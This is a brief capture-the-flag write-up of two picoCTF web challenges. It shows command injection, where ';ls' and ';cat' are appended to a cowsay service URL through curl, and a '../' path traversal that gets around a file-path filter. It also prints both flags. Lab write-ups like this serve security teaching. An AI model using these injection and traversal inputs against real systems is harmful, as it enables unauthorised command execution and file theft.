# Caas
## Description
Now presenting [cowsay as a service](https://caas.mars.picoctf.net/)

## Approach
After some googling, i found that **Cowsay** is a program that generates ASCII art pictures of a cow with a message.
I used the `curl` command to data transfer over various networks. 
`curl "https://caas.mars.picoctf.net/cowsay/pixie"`

Using the `ls` command to list the files:
`curl "https://caas.mars.picoctf.net/cowsay/pixie;ls"`

Using the `cat` command to view the `falg.txt` file:
`curl "https://caas.mars.picoctf.net/cowsay/pixie;cat%20falg.txt"`
Recieved the flag.

## Output
picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}

# Forbidden paths
## Description
Can you get the flag? Here's the [website](http://saturn.picoctf.net:58179/).
We know that the website files live in /usr/share/nginx/html/ and the flag is at /flag.txt but the website is filtering absolute file paths.
Can you get past the filter to read the flag?

## Approach
According to the description, we know to go up 4 directories because `/usr/share/nginx/html/` is 4 subdirectories from `/`
So clicking "Read" displays the file.
`../../../../../flag.txt`

## Output
picoCTF{7h3_p47h_70_5ucc355_6db46514}
